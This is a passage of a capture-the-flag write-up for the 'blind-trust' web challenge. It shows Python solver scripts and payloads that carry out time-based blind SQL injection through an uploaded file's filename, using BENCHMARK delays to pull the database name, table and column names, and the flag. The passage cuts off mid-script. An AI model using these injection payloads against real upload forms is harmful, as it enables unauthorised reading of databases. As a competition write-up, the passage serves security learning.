91
92
93
94
95
96
97
98
99
100
</pre></td><td class="rouge-code"><pre>
<span class="kn">import</span> <span class="n">aiohttp</span>
<span class="kn">import</span> <span class="n">asyncio</span>
<span class="kn">import</span> <span class="n">urllib3</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="n">URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://blind-trust.ascwg-challs.app/challenge.php?page=profile</span><span class="sh">"</span>
<span class="n">COOKIE</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">PHPSESSID</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">cookie</span><span class="sh">"</span>
<span class="p">}</span>
<span class="n">PROXIES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">https</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span>
<span class="p">}</span>

<span class="n">BOUNDARY</span> <span class="o">=</span> <span class="sh">"</span><span class="s">----geckoformboundarybf8c245aafa74d7059582a26d17cb513</span><span class="sh">"</span>
<span class="n">HEADERS</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Accept-Language</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">en-US,en;q=0.5</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Accept-Encoding</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">gzip, deflate, br</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">multipart/form-data; boundary=</span><span class="si">{</span><span class="n">BOUNDARY</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Origin</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">https://blind-trust.ascwg-challs.app</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Referer</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">https://blind-trust.ascwg-challs.app/challenge.php?page=profile</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Te</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">trailers</span><span class="sh">"</span>
<span class="p">}</span>

<span class="n">charset</span> <span class="o">=</span> <span class="sh">"</span><span class="s">abcdefghijklmnopqrstuvwxyz0123456789_</span><span class="sh">"</span>
<span class="n">png_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span>
    <span class="sh">"</span><span class="s">89504E470D0A1A0A0000000D49484452000000D800000143080600000058F6C0D9</span><span class="sh">"</span>
    <span class="sh">"</span><span class="s">000000017352474200AECE1CE90000000467414D410000B18F0BFC6105</span><span class="sh">"</span>
<span class="p">)</span>

<span class="n">DELAY_THRESHOLD</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">MAX_LEN</span> <span class="o">=</span> <span class="mi">20</span>

<span class="k">async</span> <span class="k">def</span> <span class="nf">check_character</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">char</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">Select CaSE WHEN MID(DATABASE(),</span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s">,1)=</span><span class="sh">'</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="sh">'</span><span class="s"> THEN  BENCHMArK(10000000,MD5(1)) </span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">ELSE 0  END-- .png</span><span class="sh">"</span>
    <span class="p">)</span>

    <span class="n">body</span> <span class="o">=</span> <span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">--</span><span class="si">{</span><span class="n">BOUNDARY</span><span class="si">}</span><span class="se">\r\n</span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s">file</span><span class="se">\"</span><span class="s">; filename=</span><span class="se">\"</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="se">\"\r\n</span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">Content-Type: image/png</span><span class="se">\r\n\r\n</span><span class="sh">"</span>
    <span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="n">png_data</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span> <span class="o">+</span> <span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">--</span><span class="si">{</span><span class="n">BOUNDARY</span><span class="si">}</span><span class="se">\r\n</span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s">upload</span><span class="se">\"\r\n\r\n</span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">Upload</span><span class="se">\r\n</span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">--</span><span class="si">{</span><span class="n">BOUNDARY</span><span class="si">}</span><span class="s">--</span><span class="se">\r\n</span><span class="sh">"</span>
    <span class="p">).</span><span class="nf">encode</span><span class="p">()</span>

    <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">async</span> <span class="k">with</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span>
            <span class="n">URL</span><span class="p">,</span>
            <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">,</span>
            <span class="n">cookies</span><span class="o">=</span><span class="n">COOKIE</span><span class="p">,</span>
            <span class="n">data</span><span class="o">=</span><span class="n">body</span><span class="p">,</span>
            <span class="n">proxy</span><span class="o">=</span><span class="n">PROXIES</span><span class="p">[</span><span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">],</span>
            <span class="n">ssl</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
            <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span>
        <span class="p">):</span>
            <span class="n">elapsed</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span>
            <span class="k">return</span> <span class="n">char</span><span class="p">,</span> <span class="n">elapsed</span> <span class="o">&gt;</span> <span class="n">DELAY_THRESHOLD</span>
    <span class="nf">except </span><span class="p">(</span><span class="n">aiohttp</span><span class="p">.</span><span class="n">ClientError</span><span class="p">,</span> <span class="n">asyncio</span><span class="p">.</span><span class="nb">TimeoutError</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">char</span><span class="p">,</span> <span class="bp">False</span>

<span class="k">async</span> <span class="k">def</span> <span class="nf">extract_position</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
    <span class="n">tasks</span> <span class="o">=</span> <span class="p">[</span><span class="nf">check_character</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">]</span>
    <span class="n">results</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="p">.</span><span class="nf">gather</span><span class="p">(</span><span class="o">*</span><span class="n">tasks</span><span class="p">,</span> <span class="n">return_exceptions</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">char</span><span class="p">,</span> <span class="n">success</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">success</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">char</span>
    <span class="k">return</span> <span class="bp">None</span>

<span class="k">async</span> <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Extracting database name...</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">db_name</span> <span class="o">=</span> <span class="sh">""</span>

    <span class="k">async</span> <span class="k">with</span> <span class="n">aiohttp</span><span class="p">.</span><span class="nc">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">MAX_LEN</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
            <span class="n">char</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">extract_position</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">pos</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">char</span><span class="p">:</span>
                <span class="n">db_name</span> <span class="o">+=</span> <span class="n">char</span>
                <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
                <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">break</span>

    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] Done: Database name is </span><span class="sh">'</span><span class="si">{</span><span class="n">db_name</span><span class="si">}</span><span class="sh">'"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">asyncio</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nf">main</span><span class="p">())</span>

    <span class="c1">##web_challengetest
</span></pre></td></tr></tbody></table></code></div></div>

<p>and we extracted the db name which is <code class="language-plaintext highlighter-rouge">web_challengetest</code> now let us see how many tables are there in this db, for that i used this payload</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Content-Disposition: form-data; name="file"; filename="Select CaSE WHEN (Select COuNT(*) FrOM information_schema.tables WHeRe table_schema='web_challengetest')&gt;0 THEN BENCHMArK(10000000,MD5(1)) ELSE 0 END-- .png"
</pre></td></tr></tbody></table></code></div></div>

<p>and we got that the db conatins 3 tables, now let‚Äôs get thier names i used this payload and i will provied the full solver code at the end of the writeup</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>    <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">Select CaSE WHEN MID((Select table_name FROM information_schema.tables WHERE table_schema=</span><span class="sh">'</span><span class="si">{</span><span class="n">DATABASE</span><span class="si">}</span><span class="sh">'</span><span class="s"> </span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">LIMIT 1 OFFSET </span><span class="si">{</span><span class="n">table_idx</span><span class="si">}</span><span class="s">),</span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s">,1)=</span><span class="sh">'</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="sh">'</span><span class="s"> THEN BENCHMArK(10000000,MD5(1)) ELSE 0 END-- .png</span><span class="sh">"</span>
    <span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>we extract three table name which was <code class="language-plaintext highlighter-rouge">flag</code> and <code class="language-plaintext highlighter-rouge">friends</code> i didn‚Äôt care about the thired table name acutly once i found the flag table xD.
now it‚Äôs time to get the coulmns name inside the flag table
i used this payload to get that</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">Select CaSE WHEN MID((SelecT column_name FROM information_schema.columns WHERE table_schema=</span><span class="sh">'</span><span class="si">{</span><span class="n">DATABASE</span><span class="si">}</span><span class="sh">'</span><span class="s"> </span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">AND table_name=</span><span class="sh">'</span><span class="si">{</span><span class="n">TABLE</span><span class="si">}</span><span class="sh">'</span><span class="s"> LIMIT 1 OFFSET </span><span class="si">{</span><span class="n">column_idx</span><span class="si">}</span><span class="s">),</span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s">,1)=</span><span class="sh">'</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="sh">'</span><span class="s"> THEN BENCHMArK(10000000,MD5(1)) ELSE 0 END-- .png</span><span class="sh">"</span>
    <span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>we extracted 2 coulmns <code class="language-plaintext highlighter-rouge">id</code> and <code class="language-plaintext highlighter-rouge">value</code> so let‚Äôs get the flag from value coulmn that‚Äôs inside the flag table this was the code that made me get the flag</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">aiohttp</span>
<span class="kn">import</span> <span class="n">asyncio</span>
<span class="kn">import</span> <span class="n">urllib3</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">import</span> <span class="n">logging</span>

<span class="c1"># Configure logging
</span><span class="n">logging</span><span class="p">.</span><span class="nf">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="p">.</span><span class="n">INFO</span><span class="p">,</span> <span class="nb">format</span><span class="o">=</span><span class="sh">"</span><span class="s">%(asctime)s - %(levelname)s - %(message)s</span><span class="sh">"</span><span class="p">)</span>
<span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="p">.</span><span class="nf">getLogger</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="n">URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://blind-trust.ascwg-challs.app/challenge.php?page=profile</span><span class="sh">"</span>
<span class="n">COOKIE</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">PHPSESSID</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">session_cookie</span><span class="sh">"</span>
<span class="p">}</span>
<span class="n">PROXIES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">https</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span>
<span class="p">}</span>

<span class="n">BOUNDARY</span> <span class="o">=</span> <span class="sh">"</span><span class="s">----geckoformboundarybf8c245aafa74d7059582a26d17cb513</span><span class="sh">"</span>
<span class="n">HEADERS</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Accept-Language</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">en-US,en;q=0.5</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Accept-Encoding</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">gzip, deflate, br</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">multipart/form-data; boundary=</span><span class="si">{</span><span class="n">BOUNDARY</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Origin</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">https://blind-trust.ascwg-challs.app</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Referer</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">https://blind-trust.ascwg-challs.app/challenge.php?page=profile</span><span class="sh">"</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">charset</span> <span class="o">=</span> <span class="sh">"</span><span class="s">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!@#$%^&amp;*()-=+,.:;</span><span class="sh">"</span>  <span class="c1"># Expanded for uppercase
</span><span class="n">png_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span>
    <span class="sh">"</span><span class="s">89504E470D0A1A0A0000000D49484452000000D800000143080600000058F6C0D9</span><span class="sh">"</span>
    <span class="sh">"</span><span class="s">000000017352474200AECE1CE90000000467414D410000B18F0BFC6105</span><span class="sh">"</span>
<span class="p">)</span>

<span class="n">DELAY_THRESHOLD</span> <span class="o">=</span> <span class="mi">2</span>
<span class="n">MAX_LEN</span> <span class="o">=</span> <span class="mi">50</span>
<span class="n">TABLE</span> <span class="o">=</span> <span class="sh">"</span><span class="s">flag</span><span class="sh">"</span>
<span class="n">COLUMN</span> <span class="o">=</span> <span class="sh">"</span><span class="s">value</span><span class="sh">"</span>
<span class="n">CONCURRENT_LIMIT</span> <span class="o">=</span> <span class="mi">5</span>
<span class="n">RETRY_ATTEMPTS</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">BENCHMARK_ITERATIONS</span> <span class="o">=</span> <span class="mi">10000000</span>
<span class="n">TIMEOUT</span> <span class="o">=</span> <span class="mi">20</span>

<span class="k">async</span> <span class="k">def</span> <span class="nf">check_payload</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">semaphore</span><span class="p">):</span>
    <span class="n">body</span> <span class="o">=</span> <span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">--</span><span class="si">{</span><span class="n">BOUNDARY</span><span class="si">}</span><span class="se">\r\n</span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s">file</span><span class="se">\"</span><span class="s">; filename=</span><span class="se">\"</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="se">\"\r\n</span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">Content-Type: image/png</span><span class="se">\r\n\r\n</span><span class="sh">"</span>
    <span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="n">png_data</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span> <span class="o">+</span> <span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">--</span><span class="si">{</span><span class="n">BOUNDARY</span><span class="si">}</span><span class="se">\r\n</span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s">upload</span><span class="se">\"\r\n\r\n</span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">Upload</span><span class="se">\r\n</span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">--</span><span class="si">{</span><span class="n">BOUNDARY</span><span class="si">}</span><span class="s">--</span><span class="se">\r\n</span><span class="sh">"</span>
    <span class="p">).</span><span class="nf">encode</span><span class="p">()</span>

    <span class="k">for</span> <span class="n">attempt</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">RETRY_ATTEMPTS</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
        <span class="k">async</span> <span class="k">with</span> <span class="n">semaphore</span><span class="p">:</span>
            <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="k">async</span> <span class="k">with</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span>
                    <span class="n">URL</span><span class="p">,</span>
                    <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">,</span>
                    <span class="n">cookies</span><span class="o">=</span><span class="n">COOKIE</span><span class="p">,</span>
                    <span class="n">data</span><span class="o">=</span><span class="n">body</span><span class="p">,</span>
                    <span class="n">proxy</span><span class="o">=</span><span class="n">PROXIES</span><span class="p">[</span><span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">],</span>
                    <span class="n">ssl</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
                    <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span>
                <span class="p">):</span>
                    <span class="n">elapsed</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span>
                    <span class="n">logger</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Payload </span><span class="sh">'</span><span class="si">{</span><span class="n">payload</span><span class="p">[</span><span class="si">:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s">...</span><span class="sh">'</span><span class="s">: </span><span class="si">{</span><span class="n">elapsed</span><span class="si">:</span><span class="p">.</span><span class="mi">2</span><span class="n">f</span><span class="si">}</span><span class="s">s</span><span class="sh">"</span><span class="p">)</span>
                    <span class="k">return</span> <span class="n">elapsed</span>
            <span class="nf">except </span><span class="p">(</span><span class="n">aiohttp</span><span class="p">.</span><span class="n">ClientError</span><span class="p">,</span> <span class="n">asyncio</span><span class="p">.</span><span class="nb">TimeoutError</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">attempt</span> <span class="o">&lt;</span> <span class="n">RETRY_ATTEMPTS</span><span class="p">:</span>
                    <span class="n">logger</span><span class="p">.</span><span class="nf">warning</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Retry </span><span class="si">{</span><span class="n">attempt</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">RETRY_ATTEMPTS</span><span class="si">}</span><span class="s"> for payload </span><span class="sh">'</span><span class="si">{</span><span class="n">payload</span><span class="p">[</span><span class="si">:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s">...</span><span class="sh">'</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                    <span class="k">await</span> <span class="n">asyncio</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
                    <span class="k">continue</span>
                <span class="n">logger</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Failed for payload </span><span class="sh">'</span><span class="si">{</span><span class="n">payload</span><span class="p">[</span><span class="si">:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s">...</span><span class="sh">'</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                <span class="k">return</span> <span class="mi">0</span>

<span class="k">async</span> <span class="k">def</span> <span class="nf">check_character</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">char</span><span class="p">,</span> <span class="n">semaphore</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">sELECT CAsE WHEN MID((sELECT </span><span class="si">{</span><span class="n">COLUMN</span><span class="si">}</span><span class="s"> FROM </span><span class="si">{</span><span class="n">TABLE</span><span class="si">}</span><span class="s"> LIMIT 0,1),</span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s">,1)=</span><span class="sh">'</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="sh">'</span><span class="s"> </span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">THEN BENCHMArK(</span><span class="si">{</span><span class="n">BENCHMARK_ITERATIONS</span><span class="si">}</span><span class="s">,MD5(1)) ELSE 0 END-- .png</span><span class="sh">"</span>
    <span class="p">)</span>
    <span class="n">elapsed</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">check_payload</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">semaphore</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">char</span><span class="p">,</span> <span class="n">elapsed</span> <span class="o">&gt;</span> <span class="n">DELAY_THRESHOLD</span>

<span class="k">async</span> <span class="k">def</span> <span class="nf">extract_flag</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">semaphore</span><span class="p">):</span>
    <span class="n">flag_value</span> <span class="o">=</span> <span class="sh">""</span>
    <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">MAX_LEN</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
        <span class="n">logger</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Checking position </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s"> for flag value</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">tasks</span> <span class="o">=</span> <span class="p">[</span><span class="nf">check_character</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">semaphore</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">]</span>
        <span class="n">results</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="p">.</span><span class="nf">gather</span><span class="p">(</span><span class="o">*</span><span class="n">tasks</span><span class="p">,</span> <span class="n">return_exceptions</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="n">found</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
            <span class="k">if</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="nb">Exception</span><span class="p">):</span>
